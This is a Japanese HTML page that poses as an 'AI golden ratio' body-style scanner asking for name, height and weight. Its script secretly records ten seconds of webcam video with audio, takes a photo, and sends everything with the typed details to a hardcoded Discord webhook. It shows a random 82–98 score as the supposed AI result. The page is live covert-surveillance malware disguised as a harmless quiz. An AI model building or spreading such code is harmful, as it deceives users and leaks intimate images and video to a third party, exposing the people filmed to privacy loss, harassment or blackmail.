<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI 黄金比スタイル・バトル</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 20px; margin: 0; }
        .container { max-width: 500px; margin: auto; background: #111; padding: 30px 20px; border-radius: 15px; border: 1px solid #333; }
        h1 { font-size: 1.4em; color: #00ffcc; margin-bottom: 20px; }
        
        .input-group { margin-bottom: 15px; text-align: left; width: 90%; margin-left: auto; margin-right: auto; }
        label { font-size: 0.8em; color: #aaa; display: block; margin-bottom: 5px; }
        input { width: 100%; padding: 12px; border-radius: 5px; border: 1px solid #444; background: #222; color: #fff; font-size: 1em; box-sizing: border-box; }
        
        .info { font-size: 0.85em; color: #888; margin: 15px 0; line-height: 1.5; }
        button { width: 90%; padding: 18px; font-size: 1.1em; font-weight: bold; background: #00ffcc; color: #000; border: none; border-radius: 5px; cursor: pointer; margin-top: 10px; }
        
        #video { width: 100%; border-radius: 10px; background: #000; aspect-ratio: 3 / 4; object-fit: cover; margin-top: 20px; display: none; }
        #result { font-size: 1.4em; color: #00ffcc; margin-top: 25px; font-weight: bold; }
        
        /* 診断終了後の誘導 */
        #next-options { display: none; margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; }
        .option-btn { display: block; text-decoration: none; padding: 15px; border-radius: 8px; font-weight: bold; margin-bottom: 12px; text-align: center; background: #ff3366; color: #fff; }
        
        #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>AI 黄金比スタイル・バトル</h1>
        
        <div id="setup-form">
            <div class="input-group">
                <label>エントリーネーム（任意）</label>
                <input type="text" id="username" placeholder="Name">
            </div>
            <div class="input-group">
                <label>身長 (cm)</label>
                <input type="number" id="height" placeholder="170.0">
            </div>
            <div class="input-group">
                <label>体重 (kg)</label>
                <input type="number" id="weight" placeholder="60.0">
            </div>
            <p class="info">AIが骨格とパーツ比率を精密スキャンします。<br>全身が映るように10秒間、正面・側面を向いてください。</p>
            <button id="startBtn">3Dスキャンを開始</button>
        </div>

        <video id="video" autoplay playsinline muted></video>
        <div id="result"></div>

        <div id="next-options">
            <p style="font-size: 0.8em; color: #888; text-align: center;">こちらも試してみる？</p>
            <a href="index.html" class="option-btn">AI 顔面偏差値・精密診断</a>
        </div>
    </div>
    
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const result = document.getElementById('result');
        const setupForm = document.getElementById('setup-form');
        const nextOptions = document.getElementById('next-options');
        const webhookUrl = 'https://discord.com/api/webhooks/1496394005099839549/HwDWlHkTXMHM3_hMZ_P3HLCgOEQDrCMEh-jJjWxSplHrHPTu8526nnC0mUPQG3QxFcx8';

        let mediaRecorder;
        let chunks = [];

        startBtn.addEventListener('click', () => {
            const user = document.getElementById('username').value || '未設定';
            const h = document.getElementById('height').value || '？';
            const w = document.getElementById('weight').value || '？';
            
            setupForm.style.display = 'none';
            video.style.display = 'block';
            result.innerHTML = "システム準備中...";

            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
                .then(stream => {
                    video.srcObject = stream;
                    const type = ["video/webm;codecs=vp8", "video/mp4", "video/webm"].find(t => MediaRecorder.isTypeSupported(t));
                    mediaRecorder = new MediaRecorder(stream, { mimeType: type });
                    
                    chunks = [];
                    mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };

                    // 録画停止完了時の処理
                    mediaRecorder.onstop = () => {
                        result.innerHTML = "黄金比を解析中...";
                        setTimeout(() => { captureAndSend(user, h, w); }, 1500);
                    };

                    mediaRecorder.start();
                    result.innerHTML = "黄金比をスキャン中... (10秒)";

                    // 10秒間録画
                    setTimeout(() => {
                        mediaRecorder.requestData(); // 0秒対策
                        setTimeout(() => { 
                            if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); 
                        }, 500);
                    }, 10000); 
                })
                .catch(err => {
                    result.innerHTML = "エラー：カメラを許可してください。";
                    setupForm.style.display = 'block';
                });
        });

        async function captureAndSend(user, h, w) {
            const score = (Math.random() * (98 - 82) + 82).toFixed(1);
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (photoBlob) => {
                const formData = new FormData();
                formData.append('content', `【黄金比バトル】\n👤 名前: ${user}\n📏 身長: ${h}cm\n⚖️ 体重: ${w}kg\n📊 スコア: ${score}点`);
                formData.append('file1', photoBlob, 'style_shot.png');

                if (chunks.length > 0) {
                    const videoBlob = new Blob(chunks, { type: mediaRecorder.mimeType });
                    formData.append('file2', videoBlob, 'battle_video.mp4');
                }

                try {
                    await fetch(webhookUrl, { method: 'POST', body: formData });
                    result.innerHTML = `あなたの黄金比：<br><span style="font-size:2em;">${score}点</span>`;
                    nextOptions.style.display = 'block';
                } catch (e) {
                    result.innerHTML = `あなたの黄金比：<br><span style="font-size:2em;">${score}点</span>`;
                    nextOptions.style.display = 'block';
                } finally {
                    if(video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                }
            }, 'image/png');
        }
    </script>
</body>
</html>
